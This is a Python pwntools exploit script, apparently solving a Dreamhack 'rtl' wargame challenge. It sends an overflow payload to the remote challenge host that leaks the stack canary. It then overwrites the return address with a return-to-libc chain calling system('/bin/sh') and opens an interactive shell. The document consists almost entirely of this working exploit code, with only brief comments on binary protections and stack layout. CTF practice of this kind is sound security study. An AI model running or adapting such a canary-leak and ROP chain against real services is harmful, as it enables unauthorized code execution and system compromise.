from pwn import *

'''
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
'''

'''
buf 0x30    <- rbp-0x40
dummy 0x08  <- rbp-0x10
canary 0x08 <- rbp-0x08
sfp 0x08    <- rbp
ret 0x08    <- rbp + 0x08
'''

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# p = process('./rtl')
p = remote('host1.dreamhack.games', 15478)
context.arch = 'amd64'

# 1. leak canary
buf = b'A' * 0x30 + b'B' * 9
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
canary = u64(b'\x00' + p.recvn(7))
slog('canary', canary)

# 2. Exploit
'''
addr of ("pop rdi; ret")   <= return address (RET)
addr of string "/bin/sh"   <= RET + 0x8
addr of "system" plt       <= RET + 0x10
'''
pop_rdi = 0x400853
binsh = 0x400874
system_plt = 0x4005d0
noop = 0x400285

buf = b'A' * 0x30 + b'B' * 8 + p64(canary) + b'C' * 8 + p64(noop) + p64(pop_rdi) + p64(binsh) + p64(system_plt)
p.sendafter(b'Buf: ', buf)
p.interactive()
